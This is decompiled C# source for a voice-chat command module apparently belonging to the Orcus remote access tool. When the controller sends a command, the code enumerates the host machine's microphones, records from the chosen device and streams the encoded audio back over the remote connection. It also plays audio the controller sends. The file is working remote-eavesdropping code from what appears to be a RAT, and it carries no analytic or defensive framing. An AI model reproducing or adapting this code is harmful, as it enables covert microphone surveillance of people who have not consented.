using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using CSCore.CoreAudioAPI;
using OpusWrapper.Native;
using Orcus.Commands.VoiceChat.Utilities;
using Orcus.Plugins;
using Orcus.Shared.Commands.VoiceChat;
using Orcus.Shared.Data;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.VoiceChat;

public class VoiceChatCommand : Command
{
	private CSCoreDataPlayer _cscoreDataPlayer;

	private CSCoreRecorder _cscoreRecorder;

	public override void Dispose()
	{
		((Command)this).Dispose();
		_cscoreRecorder?.Dispose();
		_cscoreRecorder = null;
		_cscoreDataPlayer?.Dispose();
		_cscoreDataPlayer = null;
	}

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Expected I4, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Expected O, but got Unknown
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_013f: Unknown result type (might be due to invalid IL or missing references)
		VoiceChatCommunication val = (VoiceChatCommunication)parameter[0];
		switch ((int)val)
		{
		case 0:
			_cscoreDataPlayer = new CSCoreDataPlayer(triggerSingleBlockRead: false);
			_cscoreDataPlayer.Initialize();
			break;
		case 1:
			_cscoreDataPlayer?.Feed(parameter, 1, parameter.Length - 1);
			break;
		case 2:
		{
			VoiceChatBeginCaptureInfo captureInfo = Serializer.FastDeserialize<VoiceChatBeginCaptureInfo>(parameter, 1);
			MMDeviceEnumerator val4 = new MMDeviceEnumerator();
			MMDevice captureDevice;
			try
			{
				MMDeviceCollection val5 = val4.EnumAudioEndpoints((DataFlow)1, (DeviceState)1);
				try
				{
					captureDevice = ((IEnumerable<MMDevice>)val5).FirstOrDefault((Func<MMDevice, bool>)((MMDevice x) => x.get_DeviceID() == captureInfo.get_DeviceId()));
				}
				finally
				{
					((IDisposable)val5)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val4)?.Dispose();
			}
			_cscoreRecorder = new CSCoreRecorder(captureDevice, triggerSingleBlockRead: false, captureInfo.get_Bitrate(), (Application)captureInfo.get_Application());
			_cscoreRecorder.DataAvailable += delegate(object sender, DataInfoAvailableEventArgs e)
			{
				//IL_0037: Unknown result type (might be due to invalid IL or missing references)
				//IL_0041: Expected O, but got Unknown
				connectionInfo.UnsafeResponse((Command)(object)this, new WriterCall(e.get_DataInfo().get_Length() + 1, (Action<Stream>)delegate(Stream stream)
				{
					stream.WriteByte(5);
					e.get_DataInfo().WriteIntoStream(stream);
				}));
			};
			_cscoreRecorder.Initialize();
			break;
		}
		case 3:
		{
			MMDeviceEnumerator val2 = new MMDeviceEnumerator();
			try
			{
				MMDeviceCollection val3 = val2.EnumAudioEndpoints((DataFlow)1, (DeviceState)1);
				try
				{
					MMDevice defaultDevice = val2.GetDefaultAudioEndpoint((DataFlow)1, (Role)2);
					try
					{
						byte[] array = new Serializer(typeof(List<CaptureDeviceInfo>)).Serialize((object)((IEnumerable<MMDevice>)val3).Select((Func<MMDevice, CaptureDeviceInfo>)delegate(MMDevice device)
						{
							//IL_0000: Unknown result type (might be due to invalid IL or missing references)
							//IL_0005: Unknown result type (might be due to invalid IL or missing references)
							//IL_0011: Unknown result type (might be due to invalid IL or missing references)
							//IL_001d: Unknown result type (might be due to invalid IL or missing references)
							//IL_003a: Expected O, but got Unknown
							CaptureDeviceInfo val6 = new CaptureDeviceInfo();
							val6.set_Id(device.get_DeviceID());
							val6.set_Name(device.get_FriendlyName());
							val6.set_IsDefault(defaultDevice.get_DeviceID() == device.get_DeviceID());
							return val6;
						}).ToList());
						((Command)this).ResponseBytes((byte)4, array, connectionInfo);
						break;
					}
					finally
					{
						if (defaultDevice != null)
						{
							((IDisposable)defaultDevice).Dispose();
						}
					}
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		default:
			throw new ArgumentOutOfRangeException();
		case 6:
			_cscoreDataPlayer.Dispose();
			_cscoreDataPlayer = null;
			break;
		case 7:
			_cscoreRecorder.Dispose();
			_cscoreRecorder = null;
			break;
		}
	}

	protected override uint GetId()
	{
		return 33u;
	}
}
